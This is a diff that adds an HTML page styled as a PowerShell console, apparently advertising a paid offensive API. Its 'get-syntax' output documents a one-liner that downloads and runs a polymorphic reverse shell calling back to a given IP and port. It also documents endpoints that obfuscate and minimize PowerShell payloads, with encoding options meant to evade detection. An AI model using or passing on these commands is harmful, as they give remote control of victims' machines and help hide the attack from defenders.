@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PowerShell Command Simulation</title>
+        <link href="https://emoji-css.afeld.me/emoji.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e0e0e0; /* You can remove this if the image covers the whole background */
+            background-image: url('https://unit259.com/web/hwp.png'); /* Path to your background image */
+            background-size: cover; /* Cover the entire area of the page */
+            background-repeat: no-repeat; /* No repeating the image */
+            background-position: center; /* Center the image on the page */
+            margin: 0;
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling if the image is larger than the viewport */
+        }
+        .window {
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            width: 80%;
+            max-width: 800px;
+            display: flex;
+            flex-direction: column;
+            position: absolute;
+            cursor: move;
+            top: 10vh; /* Initial position */
+            left: 10vw;
+            z-index: 10; /* Higher z-index */
+        }
+        .title-bar {
+            background-color: #d0d0d0;
+            padding: 10px;
+            font-weight: bold;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+            text-align: center;
+            cursor: move;
+        }
+        .console {
+            background-color: #000000; /* Dark blue background */
+            color: #CCCCCC; /* Light gray text */
+            font-family: 'Consolas', 'Courier New', monospace;
+            padding: 20px;
+            height: 500px;
+            overflow: auto;
+            flex-grow: 1;
+            box-shadow: inset 0 0 10px #000000; /* Inset shadow for depth */
+            font-size: 1.1em; /* Slightly larger font size */
+            line-height: 1.4; /* Adjusted line height for better spacing */
+        }
+
+        .input-area {
+            display: flex;
+            align-items: center;
+            background: #222;
+            padding: 10px;
+        }
+        .prompt {
+            color: white;
+            margin-right: 10px;
+        }
+                .folder-icon {
+                        font-size: 3rem; /* Size of the folder emoji */
+                        cursor: pointer;
+                        position: absolute;
+                        top: 20vh;
+                        left: 20vw;
+                        z-index: 1; /* Lower z-index */
+                        text-align: center; /* Center the label below the emoji */
+                }
+
+                .folder-label {
+                        display: block; /* Makes the label take up its own line */
+                        font-size: 1rem; /* Size of the label text */
+                        color: white; /* Color of the label text */
+                        /* Add more styling as needed */
+                }
+        input[type="text"] {
+            flex-grow: 1;
+            padding: 10px;
+            background: #222;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+        input[type="text"]::placeholder {
+            color: #555;
+        }
+        input[type="text"]:focus {
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="window" id="draggable">
+        <div class="title-bar" id="titleBar">PowerShell</div>
+        <div class="console" id="console">
+            <div id="output"></div>
+        </div>
+        <div class="input-area">
+            <span class="prompt">PS C:\></span>
+            <input type="text" id="inputCommand" placeholder="Type 'help' for help..." autofocus>
+        </div>
+    </div>
+
+
+
+<div class="folder-icon" style="left: 2vw; top: 20vh;" onclick="openFolder('Scripts')">
+    <i class="em em-warning" aria-role="presentation" aria-label="WARNING SIGN"></i>
+    <span class="folder-label">Scripts</span>
+</div>
+<div class="folder-icon" style="left: 2vw; top: 40vh;" onclick="openFolder('Files')">
+    <i class="em em-file_folder" aria-role="presentation" aria-label="FILE FOLDER"></i>
+    <span class="folder-label">Documents</span>
+</div>
+<div class="folder-icon" style="left: 2vw; top: 60vh;" onclick="openFolder('Config')">
+    <i class="em em-gear" aria-role="presentation" aria-label="GEAR"></i>
+    <span class="folder-label">Config</span>
+</div>
+
+
+
+    <!-- Add more folders as needed -->
+
+    <script>
+        document.getElementById('inputCommand').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                const command = this.value.toLowerCase();
+                const outputArea = document.getElementById('output');
+                const newCommandLine = document.createElement('div');
+                newCommandLine.className = 'command-line';
+                newCommandLine.innerHTML = '<span class="prompt">PS C:\\></span>' + command;
+                outputArea.appendChild(newCommandLine);
+
+                if (command === 'cls' || command === 'clear') {
+                    outputArea.innerHTML = '';
+                }
+
+                else if (command === 'help') {
+                    const helpText = document.createElement('div');
+                    helpText.innerHTML = `
+                        <p>Available commands:</p>
+                        <ul>
+                            <li>get-contacts - Displays contact information</li>
+                            <li>get-syntax - Displays syntax information</li>
+                            <li>get-tutorial - Displays a tutorial video</li>
+                            <li>cls or clear - Clears the console</li>
+                            <li>help - Displays this help message</li>
+                        </ul>
+                    `;
+                    outputArea.appendChild(helpText);
+                }
+
+                else if (command === 'get-syntax') {
+                    const helpText = document.createElement('div');
+                    helpText.innerHTML = `
+                    <p>Available commands:</p>
+                    <ul>
+                        <li>get-contacts - Displays contact information</li>
+                        <li>get-syntax - Displays syntax information</li>
+                        <li>get-tutorial - Displays a tutorial video</li>
+                        <li>cls or clear - Clears the console</li>
+                        <li>help - Displays this help message</li>
+                    </ul>
+
+                    <p>Reverse Shell - Generate a Unique Polymorphic Reverse Shell at runtime</p>
+                    <p>irm -Uri "https://shellsync.wtf/api1/revshell?i=45.56.115.82&p=80&e=&key=KEY-HERE" -Method POST | iex</p>
+
+                    <ul>
+                        <li>provide IP: i=45.56.115.82</li>
+                        <li>provide Port: p=80</li>
+                        <li>provide key: key=YOUR-KEY</li>
+                        <li>provide encoding: e=
+                            <ul>
+                                <li>'b' = base64</li>
+                                <li>'h' = hex</li>
+                                <li>'a' = ascii</li>
+                                <li>'u' = url</li>
+                                <li>'0' = binary</li>
+                                <li>'r' = reverse</li>
+                                <li>'x' = encrypted</li>
+                                <li>'p' = padding</li>
+                                <li>'s' = shift
+                                    <ul>
+                                        <li>shift needs to be provided an integer after it ex: s8, s6</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+
+                    <p>Obfuscate - Obfuscate any powershell payload passed up to it</p>
+                    <p>Syntax: (Full Command)</p>
+                    <p>irm -Uri 'https://shellsync.wtf/api1/obfuscate?key=YOUR_KEY_HERE&v=$channel="youtube.com/@IamJakoby";&u=jakoby.lol/wj4' -Method post</p>
+
+                    <ul>
+                        <li>Provide Key: key=YOUR-KEY</li>
+                        <li>Provide Variables: 'v=' Variables separated by ';'
+                            <ul>
+                                <li>v=$channel="youtube.com/@IamJakoby";</li>
+                                <li>'$var= PassVarsWith Spaces & Symbols' - '&' need to be replaced with '%26'</li>
+                            </ul>
+                        </li>
+                        <li>Provide URL: u=jakoby.lol/cmd</li>
+                        <li>Provide Encoding: e=
+                            <ul>
+                                <li>'b' = base64</li>
+                                <li>'h' = hex</li>
+                                <li>'a' = ascii</li>
+                                <li>'u' = url</li>
+                                <li>'0' = binary</li>
+                                <li>'r' = reverse</li>
+                                <li>'x' = encrypted</li>
+                                <li>'p' = padding</li>
+                                <li>'s' = shift
+                                    <ul>
+                                        <li>shift needs to be provided an integer after it ex: s8, s6</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+
+                    <p>Minimize - streamlines and obfuscates a script by applying multiple optimizations like shortening cmdlets, cleaning up code, and obfuscating identifiers.</p>
+                    <p>irm -Uri "https://shellsync.wtf/api1/mini?key=KEY-HERE&e=pcrwvfw&u=jakoby.lol/f0x" -Method POST</p>
+
+                    <ul>
+                        <li>Provide URL: u=jakoby.lol/cmd</li>
+                        <li>Provide Key: key=YOUR-KEY</li>
+                        <li>Provide Encoding: e=
+                            <ul>
+                                <li>'p' = parameters</li>
+                                <li>'c' = cmdlets</li>
+                                <li>'r' = remove comments</li>
+                                <li>'w' = white spaces</li>
+                                <li>'v' = variables</li>
+                                <li>'f' = functions</li>
+                                <li>'1' = one liner</li>
+                            </ul>
+                        </li>
+                    </ul>
+
+
+                    `;
+                    outputArea.appendChild(helpText);
+                }
+
+                else if (command === 'get-contacts') {
+                    const contactInfo = document.createElement('div');
+                    contactInfo.innerHTML = `
+                        <p>Discord: <a href="https://discord.gg/iamjakoby" target="_blank">discord.gg/iamjakoby</a></p>
+                        <p>Twitter: <a href="https://twitter.com/I_Am_Jakoby" target="_blank">https://twitter.com/I_Am_Jakoby</a></p>
+                    `;
+                    outputArea.appendChild(contactInfo);
+                }
+
+                else if (command === 'get-syntaxxxx') {
+                    const newResponseLine = document.createElement('p');
+                    newResponseLine.textContent = 'Displaying syntax information...';
+                    outputArea.appendChild(newResponseLine);
+                }
+
+                else if (command === 'exit') {
+                    const newResponseLine = document.createElement('p');
+                    newResponseLine.textContent = 'There is no where to run...';
+                    outputArea.appendChild(newResponseLine);
+                }
+
+
+                 else if (command === 'whoami') {
+                    const newResponseLine = document.createElement('p');
+                    newResponseLine.textContent = 'I am the ghost in the machine...';
+                    outputArea.appendChild(newResponseLine);
+                }
+
+                else if (command === 'get-tutorial') {
+                    const videoWrapper = document.createElement('div');
+                    videoWrapper.innerHTML = `
+                        <iframe width="560" height="315" src="https://www.youtube.com/embed/9kAq-OO72Uk" frameborder="0" allowfullscreen></iframe>
+                    `;
+                    outputArea.appendChild(videoWrapper);
+                } else {
+                    const newResponseLine = document.createElement('p');
+                    newResponseLine.textContent = 'Command not recognized';
+                    outputArea.appendChild(newResponseLine);
+                }
+
+                this.value = ''; // Clear the input after command is entered
+                this.focus(); // Focus back to input
+            }
+        });
+
+        function openFolder(folderName) {
+            alert("Coming soon: " + folderName);
+            // Implement the logic to handle the folder opening, like displaying contents or navigating to another page
+        }
+
+        dragElement(document.getElementById("draggable"), document.getElementById("titleBar"));
+
+        function dragElement(elmnt, header) {
+            var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+            if (header) {
+                header.onmousedown = dragMouseDown;
+            } else {
+                elmnt.onmousedown = dragMouseDown;
+            }
+
+            function dragMouseDown(e) {
+                e = e || window.event;
+                e.preventDefault();
+                pos3 = e.clientX;
+                pos4 = e.clientY;
+                document.onmouseup = closeDragElement;
+                document.onmousemove = elementDrag;
+            }
+
+            function elementDrag(e) {
+                e = e || window.event;
+                e.preventDefault();
+                pos1 = pos3 - e.clientX;
+                pos2 = pos4 - e.clientY;
+                pos3 = e.clientX;
+                pos4 = e.clientY;
+                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+            }
+
+
+            function closeDragElement() {
+                document.onmouseup = null;
+                document.onmousemove = null;
+            }
+        }
+    </script>
+</body>
+</html>
